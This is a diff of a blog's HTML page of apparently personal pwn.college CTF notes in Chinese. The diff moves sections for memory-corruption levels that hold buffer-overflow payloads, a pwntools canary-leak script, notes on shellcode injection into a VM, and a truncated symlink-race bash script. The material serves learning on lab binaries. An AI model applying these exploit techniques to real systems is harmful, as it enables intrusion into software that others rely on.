@@ -25,9 +25,9 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220117165401525.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/photo_2018-01-13_11-28-32.jpg">
-<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220426223702228.png">
-<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220430102917561.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220503162403150.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220430102917561.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220426223702228.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220507102703295.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505210342026.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220506101348091.png">
@@ -43,7 +43,7 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220515155725438.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220512222315120.png">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-16T17:09:59.101Z">
+<meta property="article:modified_time" content="2022-05-18T01:38:12.870Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -229,7 +229,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      76k 字
+      77k 字
     </span>
   
 
@@ -238,7 +238,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      950 分钟
+      968 分钟
     </span>
   
 
@@ -279,7 +279,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年5月17日 凌晨
+                  不可视境界线最后变动于：2022年5月18日 上午
                 
               </p>
             
@@ -1403,55 +1403,28 @@
 <h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><p>重复利用堆栈, 修改返回地址后顺手改写rbp+0x4开始的四字节为0x1337(4919)</p>
 <p>challenge堆栈有没有实用的位置, 应该就是对齐.</p>
 <p>发现没啥特别的, 就是固定0x40000地址, 然后跳过win_auth的验证条件直接执行read flag</p>
-<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>加上了PIE. 利用随机地址仍然是4KB对齐来修改最后两个字节, 不过最高四位只能碰运气了(\x29中的’2’)</p>
-<ul>
-<li>使用vim编辑二进制文件直接把非print字符整成一个问号存起来……换个办法修改好了…..</li>
-<li>要么使用编辑器, 要么vim中使用<code>set binary</code>或<code>-b</code>参数, 然后<code>%!xxd</code> </li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">b&#x27;\xa4\x29&#x27;</span><br></code></pre></div></td></tr></table></figure>
-
-<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>heap上malloc一个size区域, 七八十字节, 但是在这个区域中使用strlen, 在一堆ped中加入一个空字符即可. </p>
-<p>而且加了PIE. 如同上一题的做法.</p>
-<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>保护全开. <a target="_blank" rel="noopener" href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro">RELRO</a> </p>
-<p>最大的问题是开了canary.</p>
-<p>嘶—-我知道了, 利用内存寻址可以跳过canary从而直接修改retaddr.</p>
-<p>0x79下一个是0x80也是很可以. 下次写十六进制一定加前缀.</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">92</span>+<span class="hljs-string">b&#x27;\x77\x1a\x3f&#x27;</span><br></code></pre></div></td></tr></table></figure>
-
-<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>已经将flag读到了栈上, 为了printf的%s能够打印出来, 把buf前面110个字节填充为非零, 紧接着就是flag内容, 这样%s的打印就不会在110处停止.</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">110</span><br></code></pre></div></td></tr></table></figure>
-
-<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>保护全开, 这题是mmap的使用, 以前还没看过详细的机制. youtube的一个<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=8hVLcyBkSXY">视频</a>, 还不错.</p>
-<p>一连几个mmap都是没有address hint的, 全都连在一起. 而且是向低地址方向map,  最后map的region反而在低地址.</p>
-<img src="../../image/pwn-modules/image-20220426223702228.png" srcset="/img/loading.gif" lazyload alt="image-20220426223702228" style="zoom:80%;" />
-
-<p>最后的map只指定了0x5c个字节, 不过还是分配了0x1000一整个page, 全为可写可读. <strong>没搞懂的是为什么/flag映射的是只能执行也可以被printf读取出来</strong>..</p>
-<p>所以结果也很简单, 0x3000字节即可.</p>
-<h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12"></a>level12</h4><p>仍然是全开.</p>
-<p>能重复执行challenge, 难不成是leak canary? 而且还有printf %s.</p>
-<ul>
-<li>第一次0x19个(因为buf和canary之间有undefined区域)填充字符, leak出canary, 然后再次进入challenge</li>
-<li>为了能跳转到win, 必须执行完challenge, 即通过canary验证. 第一次执行覆盖了canary第一字节必定不成功, 第二次利用leak出的canary来通过验证并且修改返回地址的低两字节.</li>
-<li>这么一说感觉得用pwntools来写了.</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    p = process(<span class="hljs-string">&#x27;./babymem_level12.1.elf64&#x27;</span>)<br><br>    p.sendline(<span class="hljs-string">b&#x27;25&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;REPEAT&#x27;</span>.rjust(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)<br>    p.sendline(pl)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>    canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(canary)<br>    p.sendline(<span class="hljs-string">b&#x27;42&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;\xa4\x23&#x27;</span><br>    p.sendline(pl)                             <br><br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span>	<span class="hljs-comment">#一直试到成功为止.</span><br>    <span class="hljs-comment">#break</span><br></code></pre></div></td></tr></table></figure>
-
-<h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13"></a>level13</h4><p>大满开!</p>
-<p>重复利用没有清空的堆栈内容. flag在<code>rbp-0x10f</code>开始的0x100字节上. 所以在challenge栈帧中也从这个位置读取即可. 神奇的是有一大块空间没有被定义. 或许是定义了一个数组然后没有使用? 这样的话还不能被编译器优化掉.</p>
-<p>v5从rbp-0x120开始, 填上0x20 byte is enough.</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">17</span>                                                    <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/mnt/hgfs/LearingList/pwn.college/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">b&#x27;17\n&#x27;</span>+pl)<br></code></pre></div></td></tr></table></figure>
-<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>也是leak canary, the problem is printf() function limit the number of bytes to be output to 452, while buf size if 456 bytes. </p>
-<p>………….</p>
-<h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15"></a>level15</h4><p>TCP连接, 利用fork的特点来绕过canary.</p>
-<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcp_socket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>udp_socket = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>raw_socket = socket(AF_INET, SOCK_RAW, protocol);<br></code></pre></div></td></tr></table></figure>
+<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>和rev的18题差不多, 但是Yan85的open syscall被禁用. 他说有个memory error, 在哪里呢.</p>
+<p>保护全关, 可执行栈. 根本没有open这个libc函数, 需要hijack shellcode, 注入到哪里呢? </p>
+<p>发现了, 一个read到栈空间的调用没有检查边界:</p>
+<img src="../../image/pwn-modules/image-20220503162403150.png" srcset="/img/loading.gif" lazyload alt="image-20220503162403150" style="zoom:80%;" />
 
 <ul>
-<li><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/tubes/sockets.html">https://docs.pwntools.com/en/stable/tubes/sockets.html</a>, exempli gratia:</li>
+<li>不过要注意r2和r3只有1字节, 最多就是256. </li>
+<li>反正各种保护都没开, 可以直接定位shellcode的位置. 总共长36字节.</li>
+<li>shellcode得调用syscall, 还是用chmod简单点, shellcode就加在一开始的byte code中. 对shellcode进行Yan85译码可能会出问题, 在byte code结束之前还要修改r6的值来直接跳到指令的末尾.</li>
+<li>Yan85 code直接从memory[1024]开始, 覆盖8B register, 9B stack space, 8B saved rbp, and finally, the <code>retaddr</code> to the position of shellcode. <ul>
+<li>还有一些细节, 覆盖r6的时候可以直接修改成256在下一次译码结束执行, 这样子就不用多余的操作修改r6.</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">8</span>]: <span class="hljs-keyword">import</span> pwn <br>   ...:  <br>   ...: pwn.context.encoding = <span class="hljs-string">&quot;latin-1&quot;</span> <br>   ...:  <br>   ...: <span class="hljs-keyword">with</span> pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level15.0&quot;</span>) <span class="hljs-keyword">as</span> target: <br>   ...:     <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote: <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-string">b&quot;100\n&quot;</span>) <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Send your payload&quot;</span>, <span class="hljs-string">b&quot;test&quot;</span>) <br>   ...:         pwn.info(remote.clean().decode()) <br>   ...:                                                                                                                                                       <br>[x] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span><br>[+] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span>: pid <span class="hljs-number">7046</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span>: Trying <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>[+] Opening connection to localhost on port <span class="hljs-number">1337</span>: Done<br>[*]  (up to <span class="hljs-number">100</span> <span class="hljs-built_in">bytes</span>)!<br>    You sent <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>!<br>    Let<span class="hljs-string">&#x27;s see what happened with the stack</span><br></code></pre></div></td></tr></table></figure>
-
-
-
+</li>
+</ul>
+<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>这题在上一题的基础之上加了canary和PIE.</p>
+<p>其余部分应该是一样的, 溢出点也是一样的. 对了, write函数也没有边界检查, 可以利用这个来leak出canary和rbp.</p>
+<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>保护半开, 可用open, <strong>disallowed read_code</strong>, no bundary check in read, but write has.</p>
+<p>只允许byte code中出现一次syscall.</p>
+<p>但是发现read_memory的目的地变成了指令的区域. 于是就可以使用这个调用来输入新的代码去覆盖旧的.</p>
+<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>这次在上一题的基础上补上了read_memory的错误, 仍然只能用用一次syscall. <strong>边界检查全开</strong>.</p>
+<p>这???</p>
+<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>JIT pray, Yan85_64, 保护全开, 全新逻辑, 暂且放弃.</p>
 <h1 id="module-9-mem"><a href="#module-9-mem" class="headerlink" title="module 9-mem"></a>module 9-mem</h1><p>nothing special.</p>
 <h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>canary disabled.</p>
 <p>inject shellcode to a map region, and then overwrite return address to jmp to executing shellcode.</p>
@@ -1484,28 +1457,56 @@
 <p>只允许write和exit_group. 这是能做的吗? 一次load剩下的执行流程都会被限制.</p>
 <p>没事了, 我连他的限制的内容也可以修改. 改成我想要的就行了. 总共允许两个syscall.</p>
 <p>改成90 chmod 91 fchmod就行.</p>
-<h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><p>和rev的18题差不多, 但是Yan85的open syscall被禁用. 他说有个memory error, 在哪里呢.</p>
-<p>保护全关, 可执行栈. 根本没有open这个libc函数, 需要hijack shellcode, 注入到哪里呢? </p>
-<p>发现了, 一个read到栈空间的调用没有检查边界:</p>
-<img src="../../image/pwn-modules/image-20220503162403150.png" srcset="/img/loading.gif" lazyload alt="image-20220503162403150" style="zoom:80%;" />
+<h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><p>加上了PIE. 利用随机地址仍然是4KB对齐来修改最后两个字节, 不过最高四位只能碰运气了(\x29中的’2’)</p>
+<ul>
+<li>使用vim编辑二进制文件直接把非print字符整成一个问号存起来……换个办法修改好了…..</li>
+<li>要么使用编辑器, 要么vim中使用<code>set binary</code>或<code>-b</code>参数, 然后<code>%!xxd</code> </li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">b&#x27;\xa4\x29&#x27;</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><p>heap上malloc一个size区域, 七八十字节, 但是在这个区域中使用strlen, 在一堆ped中加入一个空字符即可. </p>
+<p>而且加了PIE. 如同上一题的做法.</p>
+<h4 id="level9-2"><a href="#level9-2" class="headerlink" title="level9"></a>level9</h4><p>保护全开. <a target="_blank" rel="noopener" href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro">RELRO</a> </p>
+<p>最大的问题是开了canary.</p>
+<p>嘶—-我知道了, 利用内存寻址可以跳过canary从而直接修改retaddr.</p>
+<p>0x79下一个是0x80也是很可以. 下次写十六进制一定加前缀.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">92</span>+<span class="hljs-string">b&#x27;\x77\x1a\x3f&#x27;</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level10-2"><a href="#level10-2" class="headerlink" title="level10"></a>level10</h4><p>已经将flag读到了栈上, 为了printf的%s能够打印出来, 把buf前面110个字节填充为非零, 紧接着就是flag内容, 这样%s的打印就不会在110处停止.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">110</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level11-2"><a href="#level11-2" class="headerlink" title="level11"></a>level11</h4><p>保护全开, 这题是mmap的使用, 以前还没看过详细的机制. youtube的一个<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=8hVLcyBkSXY">视频</a>, 还不错.</p>
+<p>一连几个mmap都是没有address hint的, 全都连在一起. 而且是向低地址方向map,  最后map的region反而在低地址.</p>
+<img src="../../image/pwn-modules/image-20220426223702228.png" srcset="/img/loading.gif" lazyload alt="image-20220426223702228" style="zoom:80%;" />
+
+<p>最后的map只指定了0x5c个字节, 不过还是分配了0x1000一整个page, 全为可写可读. <strong>没搞懂的是为什么/flag映射的是只能执行也可以被printf读取出来</strong>..</p>
+<p>所以结果也很简单, 0x3000字节即可.</p>
+<h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12"></a>level12</h4><p>仍然是全开.</p>
+<p>能重复执行challenge, 难不成是leak canary? 而且还有printf %s.</p>
+<ul>
+<li>第一次0x19个(因为buf和canary之间有undefined区域)填充字符, leak出canary, 然后再次进入challenge</li>
+<li>为了能跳转到win, 必须执行完challenge, 即通过canary验证. 第一次执行覆盖了canary第一字节必定不成功, 第二次利用leak出的canary来通过验证并且修改返回地址的低两字节.</li>
+<li>这么一说感觉得用pwntools来写了.</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    p = process(<span class="hljs-string">&#x27;./babymem_level12.1.elf64&#x27;</span>)<br><br>    p.sendline(<span class="hljs-string">b&#x27;25&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;REPEAT&#x27;</span>.rjust(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)<br>    p.sendline(pl)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>    canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(canary)<br>    p.sendline(<span class="hljs-string">b&#x27;42&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;\xa4\x23&#x27;</span><br>    p.sendline(pl)                             <br><br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span>	<span class="hljs-comment">#一直试到成功为止.</span><br>    <span class="hljs-comment">#break</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13"></a>level13</h4><p>大满开!</p>
+<p>重复利用没有清空的堆栈内容. flag在<code>rbp-0x10f</code>开始的0x100字节上. 所以在challenge栈帧中也从这个位置读取即可. 神奇的是有一大块空间没有被定义. 或许是定义了一个数组然后没有使用? 这样的话还不能被编译器优化掉.</p>
+<p>v5从rbp-0x120开始, 填上0x20 byte is enough.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">17</span>                                                    <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/mnt/hgfs/LearingList/pwn.college/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">b&#x27;17\n&#x27;</span>+pl)<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>也是leak canary, the problem is printf() function limit the number of bytes to be output to 452, while buf size if 456 bytes. </p>
+<p>………….</p>
+<h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15"></a>level15</h4><p>TCP连接, 利用fork的特点来绕过canary.</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcp_socket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>udp_socket = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>raw_socket = socket(AF_INET, SOCK_RAW, protocol);<br></code></pre></div></td></tr></table></figure>
 
 <ul>
-<li>不过要注意r2和r3只有1字节, 最多就是256. </li>
-<li>反正各种保护都没开, 可以直接定位shellcode的位置. 总共长36字节.</li>
-<li>shellcode得调用syscall, 还是用chmod简单点, shellcode就加在一开始的byte code中. 对shellcode进行Yan85译码可能会出问题, 在byte code结束之前还要修改r6的值来直接跳到指令的末尾.</li>
-<li>Yan85 code直接从memory[1024]开始, 覆盖8B register, 9B stack space, 8B saved rbp, and finally, the <code>retaddr</code> to the position of shellcode. <ul>
-<li>还有一些细节, 覆盖r6的时候可以直接修改成256在下一次译码结束执行, 这样子就不用多余的操作修改r6.</li>
+<li><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/tubes/sockets.html">https://docs.pwntools.com/en/stable/tubes/sockets.html</a>, exempli gratia:</li>
 </ul>
-</li>
-</ul>
-<h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><p>这题在上一题的基础之上加了canary和PIE.</p>
-<p>其余部分应该是一样的, 溢出点也是一样的. 对了, write函数也没有边界检查, 可以利用这个来leak出canary和rbp.</p>
-<h4 id="level9-2"><a href="#level9-2" class="headerlink" title="level9"></a>level9</h4><p>保护半开, 可用open, <strong>disallowed read_code</strong>, no bundary check in read, but write has.</p>
-<p>只允许byte code中出现一次syscall.</p>
-<p>但是发现read_memory的目的地变成了指令的区域. 于是就可以使用这个调用来输入新的代码去覆盖旧的.</p>
-<h4 id="level10-2"><a href="#level10-2" class="headerlink" title="level10"></a>level10</h4><p>这次在上一题的基础上补上了read_memory的错误, 仍然只能用用一次syscall. <strong>边界检查全开</strong>.</p>
-<p>这???</p>
-<h4 id="level11-2"><a href="#level11-2" class="headerlink" title="level11"></a>level11</h4><p>JIT pray, Yan85_64, 保护全开, 全新逻辑, 暂且放弃.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">8</span>]: <span class="hljs-keyword">import</span> pwn <br>   ...:  <br>   ...: pwn.context.encoding = <span class="hljs-string">&quot;latin-1&quot;</span> <br>   ...:  <br>   ...: <span class="hljs-keyword">with</span> pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level15.0&quot;</span>) <span class="hljs-keyword">as</span> target: <br>   ...:     <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote: <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-string">b&quot;100\n&quot;</span>) <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Send your payload&quot;</span>, <span class="hljs-string">b&quot;test&quot;</span>) <br>   ...:         pwn.info(remote.clean().decode()) <br>   ...:                                                                                                                                                       <br>[x] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span><br>[+] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span>: pid <span class="hljs-number">7046</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span>: Trying <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>[+] Opening connection to localhost on port <span class="hljs-number">1337</span>: Done<br>[*]  (up to <span class="hljs-number">100</span> <span class="hljs-built_in">bytes</span>)!<br>    You sent <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>!<br>    Let<span class="hljs-string">&#x27;s see what happened with the stack</span><br></code></pre></div></td></tr></table></figure>
+
+
+
 <h1 id="module-A-rop"><a href="#module-A-rop" class="headerlink" title="module A-rop"></a>module A-rop</h1><p>ROP</p>
 <ul>
 <li>rp++, ROPgadget.<ul>
@@ -1826,12 +1827,13 @@
 <p>改版:</p>
 <ul>
 <li>首先touch一个/home/hacker/1/a/home/b文件, 通过name和symlink验证, </li>
-<li>然后ln两个/home/hacker/2/a -&gt; /, 那么原path的dirname就是指: /home/hacker/dir(2)/a/home</li>
+<li>然后ln个/home/hacker/2/a -&gt; /, 那么原path的dirname就是指: /home/hacker/dir(2)/a/home</li>
 <li>最后再ln一个/home/hacker/3(dir)/a/home/b -&gt; /flag</li>
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir -p a/home<br>    touch a/home/b<br>elif [ $1 == 2 ]<br>then<br>    